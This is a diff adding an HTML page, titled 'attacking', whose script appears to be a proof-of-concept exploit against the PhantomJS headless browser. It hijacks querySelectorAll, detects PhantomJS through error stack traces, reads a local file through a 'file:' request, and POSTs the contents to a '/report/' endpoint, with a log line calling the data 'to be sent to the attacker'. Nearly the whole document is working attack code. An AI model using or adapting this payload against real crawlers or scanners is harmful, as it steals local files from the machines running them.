@@ -1,0 +1,40 @@
+<html><title>attacking</title>
+
+<body>
+<script>
+  (function () {
+    var XHR = XMLHttpRequest;
+    var html = document.querySelectorAll('html');
+    var oldQSA = document.querySelectorAll;
+    Document.prototype.querySelectorAll = Element.prototype.querySelectorAll = function () {
+      var err;
+      try {
+        null[0]();
+      } catch (e) {
+        err = e;
+      }
+      if (err.stack.indexOf('phantomjs') > -1) {
+        // console.log('stack is: ' + err.stack);
+        var matches = err.stack.match(/at \w*\s*\((?:(\/[^:]+):\d+:\d+\)|global code \((\/[^)]+):\d+:\d+\))/);
+        var path ='/Users/u689/phantomjs_hide_and_seek/load.js';// matches[1] || matches[2];
+        console.log('path: ' + path);
+        var xhr = new XHR();
+        xhr.open('GET', '/?r=file:' + encodeURIComponent(path), false);
+        xhr.onload = function () {
+          console.log('to be sent to the attacker:' + xhr.responseText);
+          var xhr2 = new XHR();
+          xhr2.open('POST', '/report/', false);
+          xhr2.send(xhr.responseText);
+        };
+        xhr.onerror = function (e) {
+          console.log('Error: ' + JSON.stringify(e));
+        };
+        xhr.send();
+      } else {
+        return oldQSA.apply(this, arguments);
+      }
+    };
+  })();
+</script>
+</body>
+</html>
